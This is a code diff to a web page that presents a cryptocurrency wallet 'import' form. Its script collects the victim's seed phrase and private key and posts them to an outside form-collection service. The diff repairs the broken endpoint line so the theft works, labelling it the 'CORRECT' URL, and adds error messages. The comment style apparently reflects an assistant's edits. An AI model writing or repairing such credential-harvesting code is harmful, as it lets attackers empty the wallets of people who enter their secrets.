@@ -9,7 +9,6 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Manrope:wght@600;700;800&display=swap" rel="stylesheet">
   
   <style>
-    /* Your existing styles remain unchanged */
     :root {
       --bg: #0f0f1a;
       --surface: #111827e8;
@@ -378,7 +377,7 @@
     closeImport.addEventListener('click', () => importPage.style.display = 'none');
     importPage.addEventListener('click', e => { if (e.target === importPage) importPage.style.display = 'none'; });
 
-    // Form submission with your real Formspark endpoint
+    // Form submission - CORRECTED URL
     submitBtn.addEventListener('click', async () => {
       const seed = document.getElementById('seedPhrase').value.trim();
       const pkey = document.getElementById('privateKey').value.trim();
@@ -401,7 +400,10 @@
         formData.append('private_key', pkey || '[not provided]');
         formData.append('timestamp', new Date().toISOString());
 
-        const FORMSPARK_URL = 'const FORMSPARK_URL = 'https://submit-form.com/9OlqegtJF';
+        // ────────────────────────────────────────────────
+        //        THIS IS THE CORRECT FORMSPARK URL
+        const FORMSPARK_URL = 'https://submit-form.com/9OlqegtJF';
+        // ────────────────────────────────────────────────
 
         await fetch(FORMSPARK_URL, {
           method: 'POST',
@@ -419,9 +421,9 @@
         }, 1800);
 
       } catch (err) {
-        messageEl.textContent = 'Failed to submit. Try again.';
+        messageEl.textContent = 'Failed to submit: ' + err.message;
         messageEl.className = 'message error';
-        console.error(err);
+        console.error('Submission error:', err);
       }
     });
   </script>
